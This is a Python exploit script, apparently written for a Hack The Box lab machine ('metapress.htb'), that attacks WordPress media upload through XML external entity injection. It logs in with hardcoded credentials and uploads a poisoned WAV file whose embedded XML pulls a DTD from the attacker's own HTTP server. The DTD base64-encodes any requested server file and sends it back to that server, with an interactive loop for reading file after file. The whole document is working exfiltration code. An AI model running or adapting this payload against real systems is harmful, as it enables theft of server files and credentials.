#!/usr/bin/env python3
from requests import Session, exceptions
from sys import argv
from http.server import HTTPServer, BaseHTTPRequestHandler
from base64 import b64decode
import re
from threading import Thread

def getPoisonedWav(lhost: str, lport: int) -> str:
    magic_bytes = b"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00"
    payload = magic_bytes + f"<?xml version='1.0'?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{lhost}:{lport}/'>%remote;%init;%trick;]>\x00".encode()
    return payload

def getNonce(session: Session) -> str:
    response = session.get("http://metapress.htb/wp-admin/media-new.php")
    content = response.text
    regex = "\"_wpnonce\":\"([0-9a-f]*)\""
    return re.findall(regex, content)[0]

def getLoggedInSession():
    session = Session()
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    body = {"log": "manager", "pwd": "partylikearockstar", "wp-submit": "Log In", "testcookie": 1, "redirect_to": "http://metapress.htb/wp-admin/"}
    session.post("http://metapress.htb/wp-login.php", headers=headers, data=body)
    return session

class ReceiverBaseServer(BaseHTTPRequestHandler):

    def log_message(self, *args):
        return

    def printReceivedContent(self, encodedContent:str):
        if self.server.lastReceivedMessage == encodedContent:
            self.server.lastReceivedMessage = None
            return

        self.server.lastReceivedMessage = encodedContent
        fileContent = b64decode(encodedContent)
        print(str(fileContent, "utf-8"))

    def sendDTD(self):
        self.send_header("Content-Type", "application/xml-dtd")
        self.end_headers()
        
        lhost, lport = self.server.server_address
        filepath = self.server.filepath

        response = f'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={filepath}">\n\n<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM \'http://{lhost}:{lport}/?p=%file;\'>" >\n'.encode()
        self.wfile.write(response)

    def do_GET(self):
        self.send_response(200)

        parameters = self.path.split("?p=") # Manually parse because urlib.parse.parse_qs also urldecode the base64 string
        if len(parameters) > 1:
            self.printReceivedContent(parameters[1].split("&")[0])
        else:
            self.sendDTD()

class ResponderServer(HTTPServer):

    def __init__(self, lhost: str, lport: int = 5555):
        HTTPServer.__init__(self, (lhost, lport), ReceiverBaseServer)
        self.filepath = "placeholder"
        self.payload = getPoisonedWav(lhost, lport)
        self.serverThread = None
        self.lastReceivedMessage = None

    def sendPayload(self, nonce: str, session: Session):
        file = {"async-upload": ("super-safe.wav", self.payload, "audio/x-wav")}
        body = {"html-upload": "Upload", "post_id": 0, "_wpnonce": nonce, "_wp_http_referer": "/wp-admin/media-new.php"}
        try:
            resp = session.post("http://metapress.htb/wp-admin/media-new.php", data=body, files=file, timeout=1)
        except exceptions.ReadTimeout:
            pass

    def triggerXXE(self, filepath: str):
        self.filepath = filepath
        session = getLoggedInSession()
        nonce = getNonce(session)
        self.sendPayload(nonce, session)

    def start(self):
        if self.serverThread != None:
            print("Server already running")
        thread = Thread(target=self.serve_forever)
        self.serverThread = thread
        thread.start()

    def stop(self):
        if self.serverThread == None:
            print("Server is not running")
        self.shutdown()
        self.serverThread.join()

def readFile(responder: ResponderServer, filepath: str):
    responder.start()
    responder.triggerXXE(filepath)
    responder.stop()

def interactiveReadFile(responder: ResponderServer):
    responder.start()
    try:
        print("Enter 'exit' to quit")
        while True:
            filepath = input("\n> ")
            if filepath == "exit":
                break
            responder.triggerXXE(filepath)
    except KeyboardInterrupt:
        pass
    print("\nQuitting")
    responder.stop()

def main(executable: str, lhost: str, filepath: str = None):
    session = getLoggedInSession()
    responder = ResponderServer(lhost)

    if filepath:
        readFile(responder, filepath)
    else:
        interactiveReadFile(responder)

if __name__ == "__main__":
    if len(argv) not in [2,3]:
        print(f"Usage: {argv[0]} LHOST <filepath>")
        exit(1)
    main(*argv)
